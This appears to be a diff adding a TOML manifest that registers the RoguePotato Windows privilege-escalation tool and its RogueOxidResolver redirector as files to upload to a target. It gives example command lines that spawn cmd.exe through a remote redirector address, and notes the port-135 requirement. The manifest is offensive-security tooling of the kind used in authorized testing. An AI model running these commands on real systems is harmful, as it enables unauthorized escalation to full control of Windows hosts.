@@ -1,0 +1,21 @@
+schema = 1
+kind = "upload"
+description = "Windows potato privilege escalation with a remote Oxid redirector"
+tags = ["windows", "privesc", "potato", "impersonate"]
+upstream = "https://github.com/antonioCoco/RoguePotato"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  ".\\RoguePotato.exe -r {ip} -e \"C:\\Windows\\System32\\cmd.exe\"",
+  ".\\RoguePotato.exe -r {ip} -e \"C:\\Windows\\System32\\cmd.exe\" -l 9999",
+]
+
+[[upload]]
+path = "files/RoguePotato.exe"
+as = "RoguePotato.exe"
+note = "x64; the remote redirector must use source port 135"
+
+[[upload]]
+path = "files/RogueOxidResolver.exe"
+as = "RogueOxidResolver.exe"
+note = "x64; run on the controlled remote redirector when needed"
